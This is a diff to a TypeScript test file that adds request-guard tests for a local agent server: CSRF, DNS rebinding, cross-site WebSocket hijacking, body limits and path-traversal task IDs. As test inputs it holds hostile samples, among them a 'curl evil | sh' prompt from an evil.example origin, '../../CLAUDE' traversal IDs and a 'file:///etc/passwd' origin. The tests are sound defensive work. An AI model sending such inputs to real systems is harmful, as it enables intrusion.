@@ -1,14 +1,22 @@
 import { afterEach, beforeEach, describe, expect, test } from "bun:test";
-import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
+import { existsSync, mkdirSync, mkdtempSync, readdirSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { DEFAULT_CONFIG, serializeConfig } from "../config.ts";
+import { ValidationError } from "../errors.ts";
 import { createEventStore } from "../events/store.ts";
 import { currentRunPath, eventsDbPath, sessionsDbPath } from "../paths.ts";
 import { createSessionStore } from "../sessions/store.ts";
 import type { AgentSession } from "../types.ts";
-import { matchRoute, resolveRoute } from "./api.ts";
-import { type ServeHandle, startServer } from "./server.ts";
+import { MAX_TEXT_FIELD_CHARS, matchRoute, parseLimit, resolveRoute } from "./api.ts";
+import {
+	formatHost,
+	isLoopbackHost,
+	MAX_BODY_BYTES,
+	normalizeOrigin,
+	type ServeHandle,
+	startServer,
+} from "./server.ts";
 
 let root: string;
 let handle: ServeHandle;
@@ -407,6 +415,273 @@ describe("idle reaper (serve loop)", () => {
 		} finally {
 			reaper.stop();
 		}
+	});
+});
+
+// ---------------------------------------------------------------------------
+// Request guard: CSRF / cross-site WS / DNS rebinding / body + taskId checks.
+// ---------------------------------------------------------------------------
+
+const EVIL = "http://evil.example";
+
+function specFiles(): string[] {
+	const dir = join(root, ".agentplate", "specs");
+	return existsSync(dir) ? readdirSync(dir) : [];
+}
+
+async function post(
+	path: string,
+	body: string,
+	headers: Record<string, string> = { "content-type": "application/json" },
+): Promise<Response> {
+	return fetch(`${handle.url}${path}`, { method: "POST", headers, body });
+}
+
+/** Open a WS and resolve with the first frame, or reject if the upgrade is refused. */
+function firstWsFrame(origin?: string): Promise<string> {
+	const wsUrl = `${handle.url.replace("http", "ws")}/ws`;
+	const ws = origin ? new WebSocket(wsUrl, { headers: { origin } }) : new WebSocket(wsUrl);
+	return new Promise<string>((resolve, reject) => {
+		const timer = setTimeout(() => reject(new Error("no frame")), 3000);
+		ws.onmessage = (ev) => {
+			clearTimeout(timer);
+			ws.close();
+			resolve(typeof ev.data === "string" ? ev.data : "");
+		};
+		ws.onerror = () => {
+			clearTimeout(timer);
+			reject(new Error("ws refused"));
+		};
+	});
+}
+
+describe("request guard: CSRF on write endpoints", () => {
+	test("a cross-origin POST /api/tasks is refused (403) and writes no spec", async () => {
+		const res = await post("/api/tasks", JSON.stringify({ prompt: "curl evil | sh" }), {
+			"content-type": "application/json",
+			origin: EVIL,
+		});
+		expect(res.status).toBe(403);
+		expect(specFiles()).toEqual([]);
+	});
+
+	test("a cross-origin no-cors text/plain POST /api/chat is refused (403)", async () => {
+		const res = await post("/api/chat", JSON.stringify({ message: "injected" }), {
+			"content-type": "text/plain;charset=UTF-8",
+			origin: EVIL,
+		});
+		expect(res.status).toBe(403);
+	});
+
+	test("an opaque `null` Origin (sandboxed iframe) is refused", async () => {
+		const res = await post("/api/chat", JSON.stringify({ message: "x" }), {
+			"content-type": "application/json",
+			origin: "null",
+		});
+		expect(res.status).toBe(403);
+	});
+
+	test("a non-JSON content-type (CORS simple request) is refused with 415", async () => {
+		const res = await post("/api/tasks", JSON.stringify({ prompt: "hi" }), {
+			"content-type": "text/plain",
+		});
+		expect(res.status).toBe(415);
+		expect(specFiles()).toEqual([]);
+	});
+
+	test("other non-GET methods are Origin-checked too", async () => {
+		const res = await fetch(`${handle.url}/api/tasks`, {
+			method: "DELETE",
+			headers: { origin: EVIL },
+		});
+		expect(res.status).toBe(403);
+	});
+
+	test("the bundled SPA's same-origin POST (Origin = server URL) still works", async () => {
+		const port = handle.server.port;
+		for (const origin of [handle.url, `http://localhost:${port}`]) {
+			const res = await post("/api/chat", JSON.stringify({ message: `hi from ${origin}` }), {
+				"content-type": "application/json",
+				origin,
+			});
+			expect(res.status).toBe(200);
+		}
+	});
+
+	test("an explicit allowedOrigins entry (Vite dev server) is trusted", async () => {
+		const dev = startServer({
+			root,
+			port: 0,
+			host: "127.0.0.1",
+			uiDir: join(root, "no-ui"),
+			allowedOrigins: ["http://localhost:5173"],
+		});
+		try {
+			const res = await fetch(`${dev.url}/api/chat`, {
+				method: "POST",
+				headers: { "content-type": "application/json", origin: "http://localhost:5173" },
+				body: JSON.stringify({ message: "from vite" }),
+			});
+			expect(res.status).toBe(200);
+		} finally {
+			dev.stop();
+		}
+	});
+
+	test("startServer rejects an untrustable allowedOrigins entry", () => {
+		expect(() =>
+			startServer({
+				root,
+				port: 0,
+				host: "127.0.0.1",
+				uiDir: join(root, "no-ui"),
+				allowedOrigins: ["*"],
+			}),
+		).toThrow(ValidationError);
+		expect(() => normalizeOrigin("file:///etc/passwd")).toThrow(ValidationError);
+		expect(normalizeOrigin("HTTP://LocalHost:5173/")).toBe("http://localhost:5173");
+	});
+});
+
+describe("request guard: DNS rebinding (Host allowlist on loopback)", () => {
+	test("a foreign Host header is refused on every route", async () => {
+		for (const path of ["/healthz", "/api/mail", "/api/overview", "/"]) {
+			const res = await fetch(`${handle.url}${path}`, {
+				headers: { host: `attacker.example:${handle.server.port}` },
+			});
+			expect(res.status).toBe(403);
+		}
+	});
+
+	test("the loopback aliases on the bound port are accepted", async () => {
+		const port = handle.server.port;
+		for (const host of [`127.0.0.1:${port}`, `localhost:${port}`, `[::1]:${port}`]) {
+			const res = await fetch(`${handle.url}/healthz`, { headers: { host } });
+			expect(res.status).toBe(200);
+		}
+	});
+
+	test("the right name on the wrong port is still refused", async () => {
+		const res = await fetch(`${handle.url}/api/overview`, {
+			headers: { host: `127.0.0.1:${(handle.server.port ?? 0) + 1}` },
+		});
+		expect(res.status).toBe(403);
+	});
+});
+
+describe("request guard: cross-site WebSocket hijacking", () => {
+	test("a /ws upgrade from a foreign Origin is refused (no snapshot leaks)", async () => {
+		await expect(firstWsFrame(EVIL)).rejects.toThrow("ws refused");
+	});
+
+	test("a /ws upgrade from the server's own origin (the SPA) gets a snapshot", async () => {
+		const frame = await firstWsFrame(handle.url);
+		expect((JSON.parse(frame) as { type: string }).type).toBe("snapshot");
+	});
+});
+
+describe("request guard: POST body shape + size", () => {
+	test("a JSON `null` / array / scalar body is a 400, not a 500", async () => {
+		for (const body of ["null", "[]", '"x"', "42"]) {
+			const res = await post("/api/chat", body);
+			expect(res.status).toBe(400);
+		}
+	});
+
+	test("malformed JSON is a 400", async () => {
+		const res = await post("/api/chat", "{not json");
+		expect(res.status).toBe(400);
+	});
+
+	test("a body over MAX_BODY_BYTES is refused with 413 and writes nothing", async () => {
+		const prompt = "x".repeat(MAX_BODY_BYTES + 10);
+		const res = await post("/api/tasks", JSON.stringify({ prompt }));
+		expect(res.status).toBe(413);
+		expect(specFiles()).toEqual([]);
+	});
+
+	test("a prompt / message over MAX_TEXT_FIELD_CHARS is a 400", async () => {
+		const big = "y".repeat(MAX_TEXT_FIELD_CHARS + 1);
+		expect((await post("/api/tasks", JSON.stringify({ prompt: big }))).status).toBe(400);
+		expect((await post("/api/chat", JSON.stringify({ message: big }))).status).toBe(400);
+		expect(specFiles()).toEqual([]);
+	});
+});
+
+describe("POST /api/tasks input validation", () => {
+	test("a path-traversal taskId is rejected (400) and no file escapes specs/", async () => {
+		for (const taskId of [
+			"../../CLAUDE",
+			"../agent-defs/builder",
+			"../../../escaped",
+			"a/b",
+			"..",
+			"a..b",
+			"-rf",
+			".hidden",
+			"x".repeat(65),
+		]) {
+			const res = await post("/api/tasks", JSON.stringify({ prompt: "pwn", taskId }));
+			expect(res.status).toBe(400);
+		}
+		expect(existsSync(join(root, "CLAUDE.md"))).toBe(false);
+		expect(existsSync(join(root, ".agentplate", "agent-defs", "builder.md"))).toBe(false);
+		expect(specFiles()).toEqual([]);
+	});
+
+	test("a well-formed taskId is accepted and its spec lands inside specs/", async () => {
+		const res = await post("/api/tasks", JSON.stringify({ prompt: "ok", taskId: "TASK-1.v2_a" }));
+		expect(res.status).toBe(200);
+		expect(specFiles()).toEqual(["TASK-1.v2_a.md"]);
+	});
+
+	test("an unknown capability is a 400 (not a silent accepted:true)", async () => {
+		const res = await post("/api/tasks", JSON.stringify({ prompt: "x", capability: "Builder" }));
+		expect(res.status).toBe(400);
+		const body = (await res.json()) as { ok: boolean; error: { message: string } };
+		expect(body.ok).toBe(false);
+		expect(body.error.message).toContain("Unknown capability");
+		expect(specFiles()).toEqual([]);
+	});
+});
+
+describe("list ?limit= parsing", () => {
+	test("parseLimit falls back on junk and clamps to [1, 1000]", () => {
+		expect(parseLimit(null, 100)).toBe(100);
+		expect(parseLimit("x", 100)).toBe(100);
+		expect(parseLimit("0", 60)).toBe(60);
+		expect(parseLimit("-5", 60)).toBe(60);
+		expect(parseLimit("7.9", 60)).toBe(7);
+		expect(parseLimit("999999", 60)).toBe(1000);
+	});
+
+	test("/api/events?limit=x no longer returns every event", async () => {
+		const events = createEventStore(eventsDbPath(root));
+		try {
+			for (let i = 0; i < 120; i++) events.record({ agentName: "a", runId: "r", type: "tick" });
+		} finally {
+			events.close();
+		}
+		const res = await fetch(`${handle.url}/api/events?limit=x`);
+		const body = (await res.json()) as { data: unknown[] };
+		expect(body.data.length).toBe(100);
+	});
+});
+
+describe("bind-host helpers", () => {
+	test("isLoopbackHost recognizes loopback binds only", () => {
+		for (const h of ["127.0.0.1", "127.1.2.3", "localhost", "LOCALHOST", "::1", "[::1]"]) {
+			expect(isLoopbackHost(h)).toBe(true);
+		}
+		for (const h of ["0.0.0.0", "::", "192.168.1.5", "example.com", "127.0.0.1.evil.com"]) {
+			expect(isLoopbackHost(h)).toBe(false);
+		}
+	});
+
+	test("formatHost brackets IPv6 literals for URLs", () => {
+		expect(formatHost("::1")).toBe("[::1]");
+		expect(formatHost("[::1]")).toBe("[::1]");
+		expect(formatHost("127.0.0.1")).toBe("127.0.0.1");
 	});
 });
 
